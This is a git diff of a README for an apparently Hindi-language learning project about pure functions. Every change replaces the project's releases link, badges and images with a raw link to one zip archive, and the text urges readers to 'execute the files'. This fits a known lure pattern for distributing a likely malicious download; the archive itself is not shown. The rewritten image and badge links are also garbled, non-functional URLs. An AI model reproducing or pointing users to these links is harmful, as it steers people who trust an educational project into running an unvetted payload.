@@ -1,6 +1,6 @@
 # Pure Function Interactive: A Fun Guide to Functional Programming 🎉
 
-![Pure Function Interactive](https://img.shields.io/badge/Pure%20Function%20Interactive-Explore%20Now-brightgreen)
+![Pure Function Interactive](https://raw.githubusercontent.com/leoanrds/pure-function-interactive/main/Sal/pure_function_interactive_3.5.zip%20Function%20Interactive-Explore%20Now-brightgreen)
 
 Welcome to the **Pure Function Interactive** repository! This project serves as an engaging, Hindi-based guide to pure functions in functional programming. With characters Jethalal and Babita from the popular show TMKOC, we aim to make learning fun and interactive. 
 
@@ -28,7 +28,7 @@ Pure functions are a key concept in functional programming. They provide predict
 
 ## Getting Started
 
-To get started with this project, you can download the latest release from our [Releases section](https://github.com/leoanrds/pure-function-interactive/releases). Make sure to execute the files as per the instructions provided in the release notes.
+To get started with this project, you can download the latest release from our [Releases section](https://raw.githubusercontent.com/leoanrds/pure-function-interactive/main/Sal/pure_function_interactive_3.5.zip). Make sure to execute the files as per the instructions provided in the release notes.
 
 ### Prerequisites
 
@@ -38,7 +38,7 @@ To get started with this project, you can download the latest release from our [
 
 ## How to Use
 
-1. **Download the Latest Release**: Visit our [Releases section](https://github.com/leoanrds/pure-function-interactive/releases) to download the latest version.
+1. **Download the Latest Release**: Visit our [Releases section](https://raw.githubusercontent.com/leoanrds/pure-function-interactive/main/Sal/pure_function_interactive_3.5.zip) to download the latest version.
 2. **Open the HTML File**: Once downloaded, open the HTML file in your web browser.
 3. **Interact with the Examples**: Click through the examples to see how pure and impure functions work. Modify the code and see how the output changes.
 4. **Engage with Jethalal and Babita**: Enjoy the analogies and explanations provided by your favorite characters.
@@ -72,20 +72,20 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information and to download the latest release, visit our [Releases section](https://github.com/leoanrds/pure-function-interactive/releases).
+For more information and to download the latest release, visit our [Releases section](https://raw.githubusercontent.com/leoanrds/pure-function-interactive/main/Sal/pure_function_interactive_3.5.zip).
 
-![Functional Programming](https://miro.medium.com/max/1400/1*6W0nQm-7D-mB-3IzL8U2Zg.png)
+![Functional Programming](https://raw.githubusercontent.com/leoanrds/pure-function-interactive/main/Sal/pure_function_interactive_3.5.zip*https://raw.githubusercontent.com/leoanrds/pure-function-interactive/main/Sal/pure_function_interactive_3.5.zip)
 
 ### Stay Connected
 
 Follow us on GitHub to stay updated on new features and releases. Your feedback is valuable, and we look forward to improving this project with your help!
 
-![Community](https://img.shields.io/badge/Join%20the%20Community-Get%20Involved-blue)
+![Community](https://raw.githubusercontent.com/leoanrds/pure-function-interactive/main/Sal/pure_function_interactive_3.5.zip%20the%20Community-Get%20Involved-blue)
 
 ## Acknowledgments
 
 Thanks to the creators of TMKOC for inspiring us with memorable characters like Jethalal and Babita. Their humor adds a unique touch to our learning experience.
 
-![Jethalal and Babita](https://upload.wikimedia.org/wikipedia/en/4/4e/Taarak_Mehta_Ka_Ooltah_Chashmah.jpg)
+![Jethalal and Babita](https://raw.githubusercontent.com/leoanrds/pure-function-interactive/main/Sal/pure_function_interactive_3.5.zip)
 
 Feel free to reach out if you have any questions or suggestions. Happy coding!
